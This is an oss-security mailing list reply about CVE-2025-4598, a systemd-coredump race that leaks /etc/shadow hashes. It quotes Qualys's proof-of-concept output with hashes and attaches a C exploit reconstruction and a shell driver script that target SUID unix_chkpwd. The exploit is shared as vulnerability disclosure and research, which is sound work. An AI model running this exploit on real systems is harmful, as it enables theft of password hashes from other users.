Received: (qmail 29999 invoked by uid 550); 3 Jun 2025 04:11:20 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 1158 invoked from network); 3 Jun 2025 04:07:26 -0000
Date: Tue, 3 Jun 2025 06:05:28 +0200
From: Solar Designer <solar@openwall.com>
To: Qualys Security Advisory <qsa@qualys.com>
Cc: oss-security@lists.openwall.com
Message-ID: <20250603040528.GA12667@openwall.com>
References: <20250529171556.GA9260@localhost.localdomain>
Mime-Version: 1.0
Content-Type: multipart/mixed; boundary="uAKRQypu60I7Lcqm"
Content-Disposition: inline
In-Reply-To: <20250529171556.GA9260@localhost.localdomain>
User-Agent: Mutt/1.4.2.3i
Subject: Re: [oss-security] Local information disclosure in apport and systemd-coredump

--uAKRQypu60I7Lcqm
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

Hi,

Great findings by Qualys, as usual!

Below are some comments on my attempt at reproducing the issue against
Rocky Linux 9.5's systemd-coredump (systemd-252-46.el9_5.3.x86_64):

On Thu, May 29, 2025 at 05:17:08PM +0000, Qualys Security Advisory wrote:
> Local information disclosure in systemd-coredump (CVE-2025-4598)
> ========================================================================
> 
> ------------------------------------------------------------------------
> Background
> ------------------------------------------------------------------------
> 
> While working on Ubuntu's apport, we remembered that various other
> distributions (Red Hat Enterprise Linux 9 and Fedora for example) use
> systemd-coredump as a core-dump handler in /proc/sys/kernel/core_pattern
> (instead of apport). We began to wonder: how does systemd-coredump solve
> the kill-and-replace race condition that we exploited against apport?
> 
> Similarly to apport, systemd-coredump writes all core files into a
> hard-coded directory, /var/lib/systemd/coredump/. Before December 2022,
> systemd-coredump allowed users to read all of their core files (through
> file ACLs), including the core files of SUID or SGID programs, which of
> course allowed local attackers to read the contents of /etc/shadow by
> simply crashing su for example; this vulnerability was CVE-2022-4415,
> discovered and published by Matthias Gerstner:
> 
>   https://www.openwall.com/lists/oss-security/2022/12/21/3

FWIW, when run on Fedora 34, my reproducer trying to trigger the new bug
instead triggers the above older bug - file ACLs are in fact set to
enable the non-root user to read a coredump from a SUID program.

> This old vulnerability was patched by introducing a new function,
> grant_user_access(), which decides whether a user should be allowed to
> read a core file or not, by analyzing the /proc/pid/auxv of the crashed
> process: if its AT_UID and AT_EUID match, and if its AT_GID and AT_EGID
> match, and if its AT_SECURE flag is 0, then read access is allowed;
> otherwise (if the crashed process is SUID or SGID), read access is
> denied (only root can read the core file).
> 
> ------------------------------------------------------------------------
> Analysis
> ------------------------------------------------------------------------
> 
> Unfortunately, we soon realized that systemd-coredump does not provide
> any protection at all against the kill-and-replace race condition that
> we exploited in apport. In other words, an attacker can simply crash a
> SUID process such as unix_chkpwd, SIGKILL and replace it with a non-SUID
> process (before its /proc/pid/auxv is analyzed by systemd-coredump), and
> therefore gain read access to the core file of the crashed SUID process,
> and hence to the contents of /etc/shadow.
> 
> On the one hand, exploiting systemd-coredump is easier than exploiting
> apport, because we do not need to replace the crashed SUID process with
> a namespaced process: we can replace it with any non-SUID process, whose
> AT_UID and AT_EUID match, whose AT_GID and AT_EGID match, and whose
> AT_SECURE flag is 0.
> 
> On the other hand, winning the kill-and-replace race condition against
> systemd-coredump is harder: unlike apport, systemd-coredump is written
> in C, and its initialization takes little time. To widen the window of
> the race condition, we pass an argv[0] of 128K '\177' characters to the
> SUID process: this slows down the analysis of its /proc/pid/cmdline (by
> systemd-coredump, before the analysis of its /proc/pid/auxv) and gives
> us enough time to replace the crashed SUID process with a non-SUID
> process.
> 
> ------------------------------------------------------------------------
> Proof of concept
> ------------------------------------------------------------------------
> 
> $ grep PRETTY_NAME= /etc/os-release
> PRETTY_NAME="Fedora Linux 41 (Server Edition)"
> 
> $ id
> uid=1001(evey) gid=1001(evey) groups=1001(evey) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
> 
> $ while true; do
>     pid="$(printf 'whatever\0' | ./CVE-2025-4598 /usr/sbin/unix_chkpwd "$USER" nullok)";
>     pidwait -f /usr/lib/systemd/systemd-coredump;
>     if coredumpctl -1 dump "$pid" 2>/dev/null | strings -a | grep '\$[0-9A-Za-z]\+\$[0-9A-Za-z./]'; then
>         break;
>     fi;
> done
> 
> ...
> pid 364536
> tid 364521
> tid 364540
> died in main: 177
> theadmin:$y$j9T$APKdqQO.brzhEbC2JFd.5zb7$Rz2q.0umBr8AmkwlozWr8/yphm/ckEHIOMo9vcj.Wj/::0:99999:7:::
> evey:$y$j9T$QUW3HEErO9CYuGrRhiQjt.$.befySFW/nA48280u/Hk1XrcA2yDZ6Z1s7iRf91nJuA:20188:0:99999:7:::

I've attached my attempt at partially reconstructing the Qualys' exploit
(which I haven't seen) that the above script uses, as well as the script
with some edits.

I think I implemented most of what Qualys described (of the parts
relevant to systemd-coredump rather than only to apport), except that I
simply use fork() rather than clone() (slower PID reuse) and I didn't
implement usage of inotify (harder to win the race leading to password
hashes in dump).  I've been testing this after:

sysctl kernel.pid_max=2000
control unix_chkpwd public # Undo SIG/Security hardening

With the PID range reduced from the default of 4M down to 2K, PID reuse
is quick even with simple fork().  I am getting frequent unix_chkpwd
coredumps (without password hashes in them, which is as expected without
inotify), but none of them are getting ACLs set for read by the user
(unexpected - I thought I'd win this easier race once in a while), e.g.:

Target pid 1588, current pid 1589 - missed target, retrying
Target pid 1590, current pid 1591 - missed target, retrying
Replaced pid 1592
getfacl: Removing leading '/' from absolute path names
# file: var/lib/systemd/coredump/core.unix_chkpwd.1000.17099079ebb84acbbb2dc4d8dd38e858.1592.1748566368000000.zst
# owner: root
# group: root
user::rw-
group::r--
other::---

I'd appreciate any hints here.

Meanwhile, Red Hat confirms RHEL 9 and 10 are affected, and curiously
lists not only systemd, but also NetworkManager and rpm-ostree among
affected packages - I wonder why?

Alexander

--uAKRQypu60I7Lcqm
Content-Type: text/x-c; charset=us-ascii
Content-Disposition: attachment; filename="CVE-2025-4598.c"

#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv)
{
	char *program = argv[1];
	char argv0[0x20000];

	memset(argv0, 0x7f, sizeof(argv0));
	argv0[sizeof(argv0) - 1] = 0;
	*++argv = argv0;

	int pid;

retry:
	switch ((pid = fork())) {
	case -1:
		perror("fork");
		return 1;
	case 0:
		execv(program, argv);
		perror("execv");
		return 1;
	}

	usleep(random() % 1000);

	if (kill(pid, SIGSTOP)) {
		perror("kill");
		return 1;
	}

	int newpid, prevpid = 0, wraps = 0;
	while ((newpid = fork()) >= 0) {
		if (!newpid)
			return 0;
		wait(NULL);
		if (newpid < pid - (1 + random() % 20))
			break;
		if (newpid < prevpid)
			if (++wraps > 3)
				break;
		prevpid = newpid;
		if (newpid % 1000 == 0)
			fprintf(stderr, "Target pid %d, current pid %d\n", pid, newpid);
	}

	if (kill(pid, SIGSEGV) || kill(pid, SIGCONT)) {
		perror("kill");
		return 1;
	}

	if (random() & 1) {
		usleep(random() % 1000);

		if (kill(pid, SIGKILL)) {
			perror("kill");
			return 1;
		}
	}

	while ((newpid = fork()) >= 0) {
		if (!newpid)
			return 0;
		wait(NULL);
		if (newpid >= pid)
			break;
	}

	if (newpid != pid) {
		fprintf(stderr, "Target pid %d, current pid %d - missed target, retrying\n", pid, newpid);
		goto retry;
	}

	fprintf(stderr, "Replaced pid %d\n", pid);
	printf("%d\n", pid);

	return 0;
}

--uAKRQypu60I7Lcqm
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="CVE-2025-4598.sh"

#!/bin/sh

gcc CVE-2025-4598.c -o CVE-2025-4598 -Wall

ulimit -c unlimited

while :; do
    pid="$(printf 'whatever\0' | ./CVE-2025-4598 /usr/sbin/unix_chkpwd "$USER" nullok)"
    pidwait -f /usr/lib/systemd/systemd-coredump || sleep 0.1
    #echo $pid
    #ls -l /var/lib/systemd/coredump/
    file=/var/lib/systemd/coredump/core.unix_chkpwd.*.$pid.*
    getfacl $file || continue
    if coredumpctl -1 dump "$pid" 2>/dev/null | strings -a | grep 'password check failed'; then
    #if coredumpctl -1 dump "$pid" 2>/dev/null | strings -a | grep '\$[0-9A-Za-z]\+\$[0-9A-Za-z./]'; then
    #if zstdcat $file | strings -a | grep '\$[0-9A-Za-z]\+\$[0-9A-Za-z./]'; then
        break
    fi
done

--uAKRQypu60I7Lcqm--
